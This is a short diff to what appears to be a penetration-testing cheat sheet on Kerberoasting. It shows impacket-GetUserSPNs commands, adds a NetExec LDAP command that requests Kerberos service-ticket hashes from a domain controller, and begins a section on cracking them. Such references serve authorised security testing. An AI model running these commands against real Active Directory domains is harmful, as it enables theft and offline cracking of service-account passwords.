@@ -38,6 +38,9 @@ impacket-GetUserSPNs -dc-ip <dcip> domain.local/username -request
 impacket-GetUserSPNs -dc-ip <dcip> domain.local/username -request-user
 ```
 you can also use `-outputfile <name>`
+```
+nxc ldap <IP> -u 'user' -p '' --kerberoasting <OUTFILE>
+```
 
 **Crack hash**
 ```PowerShell
